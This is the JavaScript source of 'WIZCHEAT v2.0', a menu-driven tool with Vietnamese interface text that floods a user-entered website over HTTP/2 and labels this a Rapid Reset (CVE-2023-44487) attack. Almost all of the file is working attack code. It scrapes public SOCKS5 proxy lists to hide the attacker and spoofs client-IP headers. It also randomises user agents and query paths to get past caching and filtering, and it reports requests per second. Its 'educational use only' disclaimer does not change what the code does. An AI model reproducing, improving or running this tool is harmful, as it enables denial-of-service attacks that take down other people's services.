// =============================================================================
//  ██╗    ██╗██╗███████╗ ██████╗██╗  ██╗███████╗ █████╗ ████████╗
//  ██║    ██║██║██╔════╝██╔════╝██║  ██║██╔════╝██╔══██╗╚══██╔══╝
//  ██║ █╗ ██║██║█████╗  ██║     ███████║█████╗  ███████║   ██║   
//  ██║███╗██║██║██╔══╝  ██║     ██╔══██║██╔══╝  ██╔══██║   ██║   
//  ╚███╔███╔╝██║██║     ╚██████╗██║  ██║███████╗██║  ██║   ██║   
//   ╚══╝╚══╝ ╚═╝╚═╝      ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   
// ====================== WIZCHEAT v2.0 ========================================
// ============= HTTP/2 RAPID RESET + SOCKS5 PROXY + ULTRA FAST ================
// =============================================================================

const http2 = require('http2');
const tls = require('tls');
const net = require('net');
const fs = require('fs');
const axios = require('axios');
const colors = require('colors');
const crypto = require('crypto');
const cluster = require('cluster');
const { exec } = require('child_process');
const readline = require('readline');
const urlModule = require('url');

// ======================== MÀU SẮC ========================
const c = {
    reset: '\x1b[0m',
    bright: '\x1b[1m',
    dim: '\x1b[2m',
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m',
    white: '\x1b[37m',
    bgRed: '\x1b[41m',
    bgGreen: '\x1b[42m',
    bgYellow: '\x1b[43m',
    bgBlue: '\x1b[44m'
};

function log(msg, type = 'INFO') {
    const colorsMap = {
        'INFO': c.cyan,
        'OK': c.green,
        'WARN': c.yellow,
        'ERROR': c.red,
        'ATTACK': c.magenta,
        'SUCCESS': c.green
    };
    const prefix = colorsMap[type] || c.white;
    console.log(`${prefix}[${type}]${c.reset} ${msg}`);
}

function clearScreen() {
    process.stdout.write('\x1b[2J\x1b[0f');
}

function banner() {
    clearScreen();
    console.log(`${c.bright}${c.red}`);
    console.log('╔════════════════════════════════════════════════════════════════════════════════╗');
    console.log('║${c.cyan}                                                                                ${c.red}║');
    console.log(`║${c.magenta}     ██╗    ██╗██╗███████╗ ██████╗██╗  ██╗███████╗ █████╗ ████████╗${c.red}     ║`);
    console.log(`║${c.magenta}     ██║    ██║██║██╔════╝██╔════╝██║  ██║██╔════╝██╔══██╗╚══██╔══╝${c.red}     ║`);
    console.log(`║${c.magenta}     ██║ █╗ ██║██║█████╗  ██║     ███████║█████╗  ███████║   ██║   ${c.red}     ║`);
    console.log(`║${c.magenta}     ██║███╗██║██║██╔══╝  ██║     ██╔══██║██╔══╝  ██╔══██║   ██║   ${c.red}     ║`);
    console.log(`║${c.magenta}     ╚███╔███╔╝██║██║     ╚██████╗██║  ██║███████╗██║  ██║   ██║   ${c.red}     ║`);
    console.log(`║${c.magenta}      ╚══╝╚══╝ ╚═╝╚═╝      ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ${c.red}     ║`);
    console.log(`║${c.cyan}                                                                                ${c.red}║`);
    console.log(`║${c.green}                    WIZCHEAT v2.0 - ULTIMATE EDITION${c.red}                           ║`);
    console.log(`║${c.yellow}                    ⚡ HTTP/2 RAPID RESET | SOCKS5 | 50K+ RPS ⚡${c.red}                  ║`);
    console.log(`║${c.green}                    🔥 MADE BY TEAM | FOR EDUCATIONAL USE ONLY 🔥${c.red}                ║`);
    console.log(`${c.red}╚════════════════════════════════════════════════════════════════════════════════╝${c.reset}`);
    console.log();
}

// ======================== BIẾN TOÀN CỤC ========================
let proxies = [];
let activeWorkers = 0;
let totalRequests = 0;
let stats = { requests: 0, success: 0, errors: 0, goaway: 0, forbidden: 0 };
let statusInterval = null;
let attackInterval = null;
let isAttacking = false;

// ======================== TIỆN ÍCH ========================
function randomString(len = 16) {
    return crypto.randomBytes(len).toString('hex').slice(0, len);
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomUserAgent() {
    const agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36 Edg/118.0.0.0'
    ];
    return agents[Math.floor(Math.random() * agents.length)];
}

function randomIP() {
    return `${randomInt(1,255)}.${randomInt(0,255)}.${randomInt(0,255)}.${randomInt(1,255)}`;
}

function randomHeaders(host) {
    return {
        ':method': 'GET',
        ':path': `/?${randomString(10)}=${randomString(8)}&t=${Date.now()}`,
        ':scheme': 'https',
        ':authority': host,
        'user-agent': randomUserAgent(),
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'accept-encoding': 'gzip, deflate, br',
        'cache-control': 'no-cache, no-store, must-revalidate',
        'pragma': 'no-cache',
        'upgrade-insecure-requests': '1',
        'x-forwarded-for': randomIP(),
        'x-real-ip': randomIP(),
        'cf-connecting-ip': randomIP()
    };
}

// ======================== PROXY LOADER ========================
function loadProxiesFromFile(filePath) {
    if (!fs.existsSync(filePath)) {
        log(`File ${filePath} không tồn tại!`, 'WARN');
        return [];
    }
    const content = fs.readFileSync(filePath, 'utf8');
    const lines = content.split('\n').filter(l => l.trim() && !l.startsWith('#'));
    const proxyList = [];
    for (const line of lines) {
        let proxy = line.trim();
        if (!proxy.includes('://')) {
            proxy = `socks5://${proxy}`;
        }
        proxyList.push(proxy);
    }
    log(`Đã tải ${proxyList.length} proxy từ ${filePath}`, 'OK');
    return proxyList;
}

async function scrapeProxies() {
    log('Đang thu thập proxy từ các nguồn...', 'INFO');
    const sources = [
        'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
        'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt',
        'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt',
        'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt',
        'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt'
    ];
    const allProxies = new Set();
    for (const url of sources) {
        try {
            const response = await axios.get(url, { timeout: 10000 });
            const lines = response.data.split('\n');
            for (const line of lines) {
                let proxy = line.trim();
                if (proxy && !proxy.startsWith('#')) {
                    if (!proxy.includes('://')) {
                        proxy = `socks5://${proxy}`;
                    }
                    allProxies.add(proxy);
                }
            }
            log(`Đã lấy từ ${url.split('/').pop()}`, 'OK');
        } catch (error) {
            log(`Lỗi khi lấy từ ${url}: ${error.message}`, 'WARN');
        }
    }
    const proxyList = Array.from(allProxies);
    log(`Tổng cộng đã thu thập ${proxyList.length} proxy`, 'OK');
    fs.writeFileSync('proxies.txt', proxyList.join('\n'));
    log('Đã lưu vào proxies.txt', 'OK');
    return proxyList;
}

// ======================== HTTP/2 RAPID RESET ENGINE ========================
function createSocks5Socket(proxyUrl, targetHost, targetPort) {
    return new Promise((resolve, reject) => {
        const proxyParsed = new urlModule.URL(proxyUrl);
        const proxyHost = proxyParsed.hostname;
        const proxyPort = parseInt(proxyParsed.port) || 1080;
        
        const socket = net.createConnection({ host: proxyHost, port: proxyPort }, () => {
            const authBuf = Buffer.from([0x05, 0x01, 0x00]);
            socket.write(authBuf);
        });
        
        socket.once('data', (data) => {
            if (data[0] !== 0x05) {
                socket.destroy();
                reject(new Error('SOCKS5 không hỗ trợ'));
                return;
            }
            const cmdBuf = Buffer.alloc(10);
            cmdBuf[0] = 0x05;
            cmdBuf[1] = 0x01;
            cmdBuf[2] = 0x00;
            cmdBuf[3] = 0x03;
            const hostLen = Buffer.byteLength(targetHost);
            cmdBuf[4] = hostLen;
            let pos = 5;
            cmdBuf.write(targetHost, pos);
            pos += hostLen;
            cmdBuf.writeUInt16BE(targetPort, pos);
            socket.write(cmdBuf.slice(0, pos + 2));
            
            socket.once('data', (resp) => {
                if (resp[1] === 0x00) {
                    const tlsSocket = tls.connect({
                        socket: socket,
                        servername: targetHost,
                        rejectUnauthorized: false
                    });
                    tlsSocket.once('secureConnect', () => resolve(tlsSocket));
                    tlsSocket.on('error', reject);
                } else {
                    socket.destroy();
                    reject(new Error('SOCKS5 kết nối thất bại'));
                }
            });
        });
        socket.on('error', reject);
        setTimeout(() => {
            socket.destroy();
            reject(new Error('SOCKS5 timeout'));
        }, 5000);
    });
}

function createDirectSocket(targetHost, targetPort) {
    return new Promise((resolve, reject) => {
        const socket = tls.connect({ host: targetHost, port: targetPort, rejectUnauthorized: false }, () => {
            resolve(socket);
        });
        socket.on('error', reject);
        setTimeout(() => {
            socket.destroy();
            reject(new Error('Direct timeout'));
        }, 5000);
    });
}

async function rapidResetAttack(targetUrl, duration, useProxy = true, proxyUrl = null) {
    const parsed = new urlModule.URL(targetUrl);
    const targetHost = parsed.hostname;
    const targetPort = parseInt(parsed.port) || 443;
    const endTime = Date.now() + duration * 1000;
    let requestCount = 0;
    let successCount = 0;
    let errorCount = 0;
    
    while (Date.now() < endTime && isAttacking) {
        try {
            let socket;
            if (useProxy && proxyUrl) {
                socket = await createSocks5Socket(proxyUrl, targetHost, targetPort);
            } else {
                socket = await createDirectSocket(targetHost, targetPort);
            }
            
            const client = http2.connect(`https://${targetHost}`, { createConnection: () => socket });
            
            client.on('error', (err) => {
                errorCount++;
                stats.errors++;
            });
            
            client.on('goaway', () => {
                stats.goaway++;
            });
            
            for (let i = 0; i < 10; i++) {
                if (Date.now() >= endTime) break;
                const headers = randomHeaders(targetHost);
                const stream = client.request(headers);
                stream.on('response', (response) => {
                    requestCount++;
                    stats.requests++;
                    if (response[':status'] < 400) {
                        successCount++;
                        stats.success++;
                    } else if (response[':status'] === 403) {
                        stats.forbidden++;
                    }
                });
                stream.on('error', () => {
                    errorCount++;
                    stats.errors++;
                });
                stream.end();
            }
            
            setTimeout(() => {
                client.close();
            }, 100);
            
        } catch (err) {
            errorCount++;
            stats.errors++;
        }
        
        await new Promise(r => setTimeout(r, 10));
    }
    
    return { requestCount, successCount, errorCount };
}

// ======================== ATTACK ORCHESTRATOR ========================
async function startAttack(target, duration, threads, proxyFile) {
    isAttacking = true;
    activeWorkers = threads;
    totalRequests = 0;
    stats = { requests: 0, success: 0, errors: 0, goaway: 0, forbidden: 0 };
    
    let proxyList = [];
    if (proxyFile === 'scrape') {
        proxyList = await scrapeProxies();
    } else if (proxyFile && fs.existsSync(proxyFile)) {
        proxyList = loadProxiesFromFile(proxyFile);
    } else {
        log('Không tìm thấy proxy, sẽ tấn công trực tiếp', 'WARN');
    }
    
    log(`Bắt đầu tấn công ${target} trong ${duration} giây với ${threads} luồng`, 'ATTACK');
    log(`Số proxy khả dụng: ${proxyList.length}`, 'INFO');
    
    const workers = [];
    const startTime = Date.now();
    
    for (let i = 0; i < threads; i++) {
        const useProxy = proxyList.length > 0 && (i % 2 === 0);
        const proxy = useProxy ? proxyList[i % proxyList.length] : null;
        const worker = rapidResetAttack(target, duration, useProxy, proxy);
        workers.push(worker);
    }
    
    statusInterval = setInterval(() => {
        const elapsed = (Date.now() - startTime) / 1000;
        const rps = stats.requests / elapsed;
        console.log(`\r${c.cyan}[${c.green}STATUS${c.cyan}]${c.reset} 📊 Requests: ${c.green}${stats.requests.toLocaleString()}${c.reset} | ✅ Success: ${c.green}${stats.success.toLocaleString()}${c.reset} | ❌ Errors: ${c.red}${stats.errors.toLocaleString()}${c.reset} | 🚫 403: ${c.yellow}${stats.forbidden}${c.reset} | ⚡ RPS: ${c.magenta}${rps.toFixed(0)}${c.reset} | ⏱️ Time: ${c.cyan}${elapsed.toFixed(0)}/${duration}s${c.reset}`, 0);
    }, 1000);
    
    await Promise.all(workers);
    
    clearInterval(statusInterval);
    isAttacking = false;
    const elapsed = (Date.now() - startTime) / 1000;
    const avgRps = stats.requests / elapsed;
    
    console.log('\n');
    log('═══════════════════════════════════════════════════', 'INFO');
    log(`✅ TẤN CÔNG HOÀN TẤT!`, 'SUCCESS');
    log(`📊 Tổng request: ${c.green}${stats.requests.toLocaleString()}${c.reset}`);
    log(`✅ Thành công: ${c.green}${stats.success.toLocaleString()}${c.reset}`);
    log(`❌ Lỗi: ${c.red}${stats.errors.toLocaleString()}${c.reset}`);
    log(`🚫 Forbidden (403): ${c.yellow}${stats.forbidden}${c.reset}`);
    log(`⚡ RPS trung bình: ${c.magenta}${avgRps.toFixed(0)}${c.reset}`);
    log(`⏱️ Thời gian: ${c.cyan}${elapsed.toFixed(1)}s${c.reset}`);
    log('═══════════════════════════════════════════════════', 'INFO');
}

// ======================== MENU & UI ========================
function showMenu() {
    console.log(`
${c.bright}${c.cyan}╔════════════════════════════════════════════════════════════════╗
║                         ${c.yellow}MENU CHÍNH${c.cyan}                              ║
╠════════════════════════════════════════════════════════════════╣
║  ${c.green}[1]${c.reset} Tấn công DDoS (HTTP/2 Rapid Reset)                       ║
║  ${c.green}[2]${c.reset} Thu thập proxy (Scrape)                                 ║
║  ${c.green}[3]${c.reset} Kiểm tra proxy sống                                     ║
║  ${c.green}[4]${c.reset} Xem thông tin & hướng dẫn                               ║
║  ${c.green}[5]${c.reset} Thoát                                                   ║
╚════════════════════════════════════════════════════════════════╝${c.reset}
    `);
}

async function main() {
    banner();
    
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    
    const question = (query) => new Promise(resolve => rl.question(query, resolve));
    
    while (true) {
        showMenu();
        const choice = await question(`${c.green}[?]${c.reset} Chọn chức năng (1-5): `);
        
        if (choice === '1') {
            const target = await question(`${c.green}[?]${c.reset} Nhập URL mục tiêu (https://example.com): `);
            let duration = parseInt(await question(`${c.green}[?]${c.reset} Thời gian tấn công (giây, mặc định 60): `) || '60');
            let threads = parseInt(await question(`${c.green}[?]${c.reset} Số luồng (mặc định 100): `) || '100');
            let proxyOption = await question(`${c.green}[?]${c.reset} File proxy (bỏ trống = không proxy, 'scrape' = tự lấy, hoặc tên file): `);
            
            if (isNaN(duration)) duration = 60;
            if (isNaN(threads)) threads = 100;
            if (threads > 1000) {
                log('Số luồng quá lớn! Giới hạn xuống 1000', 'WARN');
                threads = 1000;
            }
            
            await startAttack(target, duration, threads, proxyOption || null);
            await question(`\n${c.green}[?]${c.reset} Nhấn Enter để tiếp tục...`);
        } else if (choice === '2') {
            log('Đang thu thập proxy...', 'INFO');
            const proxies = await scrapeProxies();
            log(`Đã thu thập ${proxies.length} proxy, lưu vào proxies.txt`, 'SUCCESS');
            await question(`\n${c.green}[?]${c.reset} Nhấn Enter để tiếp tục...`);
        } else if (choice === '3') {
            const file = await question(`${c.green}[?]${c.reset} Nhập file proxy (mặc định proxies.txt): `);
            const proxyFile = file || 'proxies.txt';
            if (!fs.existsSync(proxyFile)) {
                log(`File ${proxyFile} không tồn tại!`, 'ERROR');
            } else {
                log('Đang kiểm tra proxy...', 'INFO');
                const proxyList = loadProxiesFromFile(proxyFile);
                let alive = 0;
                for (const proxy of proxyList.slice(0, 50)) {
                    try {
                        const parsed = new urlModule.URL(proxy);
                        const socket = await createSocks5Socket(proxy, 'httpbin.org', 443);
                        socket.destroy();
                        alive++;
                        console.log(`✅ ${proxy} - ALIVE`);
                    } catch (err) {
                        console.log(`❌ ${proxy} - DEAD`);
                    }
                }
                log(`Kết quả: ${alive}/${Math.min(50, proxyList.length)} proxy hoạt động`, 'INFO');
            }
            await question(`\n${c.green}[?]${c.reset} Nhấn Enter để tiếp tục...`);
        } else if (choice === '4') {
            console.log(`
${c.bright}${c.cyan}════════════════════════════════════════════════════════════════${c.reset}
${c.green}🔧 HƯỚNG DẪN SỬ DỤNG WIZCHEAT v2.0${c.reset}
${c.cyan}────────────────────────────────────────────────────────────────${c.reset}
${c.yellow}1. Tấn công DDoS:${c.reset}
   - Sử dụng HTTP/2 Rapid Reset (lỗ hổng CVE-2023-44487)
   - Hỗ trợ SOCKS5 proxy để ẩn danh
   - Tự động random headers, user-agent, IP

${c.yellow}2. Thu thập proxy:${c.reset}
   - Tự động lấy proxy từ 5 nguồn khác nhau
   - Lưu vào file proxies.txt

${c.yellow}3. Yêu cầu hệ thống:${c.reset}
   - Node.js v16 trở lên
   - Cài module: npm install axios colors

${c.yellow}4. Lưu ý:${c.reset}
   - Chỉ dùng cho mục đích kiểm tra bảo mật
   - Không dùng để tấn công trái phép
${c.cyan}════════════════════════════════════════════════════════════════${c.reset}
            `);
            await question(`\n${c.green}[?]${c.reset} Nhấn Enter để tiếp tục...`);
        } else if (choice === '5') {
            log('Tạm biệt!', 'INFO');
            process.exit(0);
        }
        
        banner();
    }
}

// ======================== START ========================
if (cluster.isMaster) {
    main().catch(console.error);
} else {
    // Worker processes do not
}
